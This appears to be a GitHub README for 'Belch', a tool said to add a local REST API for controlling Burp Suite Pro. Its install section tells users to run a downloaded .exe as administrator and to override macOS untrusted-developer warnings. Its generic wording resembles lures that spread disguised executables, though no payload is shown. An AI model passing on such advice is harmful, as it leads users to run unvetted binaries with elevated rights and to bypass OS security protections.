# 🚀 Belch - Effortless Control of Burp Suite

[![Download Belch](https://img.shields.io/badge/Download%20Belch-v1.0-brightgreen)](https://github.com/SuperGaming20/Belch/releases)

## 🔍 Introduction

Belch is an application designed to enhance your experience with Burp Suite Pro. By adding a local REST API, you gain instant and scriptable control over proxy settings, scanning functions, and the security scope in your web applications. Whether you are new to web security or an experienced professional, Belch makes managing your security tasks easier.

## 📦 Features

- **Local REST API**: Access and control Burp Suite functions easily.
- **Scriptable Control**: Automate tasks using simple scripts.
- **User-Friendly Interface**: No complex programming knowledge required.
- **Enhanced Proxy Management**: Quickly change proxy settings.
- **Customizable Scanning Options**: Adjust scanning parameters according to your needs.

## 📋 System Requirements

To run Belch, ensure your system meets the following requirements:

- **Operating System**: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu, Fedora).
- **Burp Suite Version**: Burp Suite Pro 2.0 or later.
- **Memory**: At least 4GB of RAM.
- **Disk Space**: A minimum of 50MB free space.

## 🚀 Getting Started

To start using Belch, follow these easy steps:

1. **Visit the Releases Page**: Click [here to download](https://github.com/SuperGaming20/Belch/releases).
2. **Download the Latest Version**: Find the latest version of Belch on the releases page.
3. **Install**: 
    - For Windows, double-click the `.exe` file to launch the installer.
    - For macOS, drag the Belch app into your Applications folder.
    - For Linux, extract the `.tar.gz` file and run the provided script to install.

4. **Open Burp Suite Pro**: Ensure that Burp Suite Pro is running.
5. **Launch Belch**: Open the Belch application.

## 📥 Download & Install

To get Belch, simply visit the [Releases page](https://github.com/SuperGaming20/Belch/releases) and click on the latest version to download. 

### Installation Instructions

- **Windows**:
  1. Locate the downloaded `.exe` file.
  2. Right-click and select "Run as administrator."
  3. Follow the on-screen prompts to complete the installation.

- **macOS**:
  1. Open your Applications folder.
  2. Find and double-click the Belch app.
  3. If you receive a warning about an untrusted developer, go to System Preferences > Security & Privacy, then click "Open Anyway."

- **Linux**:
  1. Open a terminal.
  2. Navigate to the folder where you extracted Belch.
  3. Run the command `./install.sh` to set up the application.

## 🔧 Configuration

After installation, configure Belch to work with your Burp Suite Pro:

1. **Set up the Proxy**: In Burp Suite, navigate to the "Proxy" tab. Ensure the settings match those specified in Belch.
2. **API Key**: You may need to generate an API key in Burp Suite. This key allows Belch to communicate effectively with Burp.
3. **Script Setup**: If you plan to use scripts, create a simple script in your preferred language that interacts with the Belch API.

## ⚙️ Using Belch

Once the setup is complete, begin using Belch:

- **Accessing the API**: Use any HTTP client like Postman or a web browser to send requests to the Belch API.
- **Executing Commands**: Try commands like starting a scan or changing proxy settings through the API.

### Example Commands

1. **Start a Scan**: Send a POST request to `http://localhost:YOUR_PORT/start-scan`.
2. **Change Proxy Settings**: Use the PUT method to `http://localhost:YOUR_PORT/proxy` and supply the new settings in the body.

## 🛠️ Troubleshooting

If you encounter issues:

- **Check the Installation**: Ensure that Belch is correctly installed and linked to Burp Suite.
- **Review Proxy Settings**: Confirm that your proxy settings are correct.
- **Firewall Access**: Ensure that your firewall or antivirus allows Belch to communicate with Burp Suite.

## 🤝 Community and Support

For further assistance, look for help in our community:

- [GitHub Issues](https://github.com/SuperGaming20/Belch/issues): Report bugs or get support.
- [Discussion Threads](https://github.com/SuperGaming20/Belch/discussions): Join conversations or ask questions.

## 📖 Additional Resources

Check out these resources to enhance your understanding of the tools:

- [Official Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Web Security Resources](https://owasp.org/www-project-top-ten/)
- [API Basics](https://www.restapitutorial.com/)

## 📤 Feedback

Your feedback is valuable. If you have any thoughts or suggestions, please share them via our GitHub page or directly in the Discussions section.

For a seamless experience, follow the above steps to download and use Belch effectively. Enjoy your enhanced control over Burp Suite.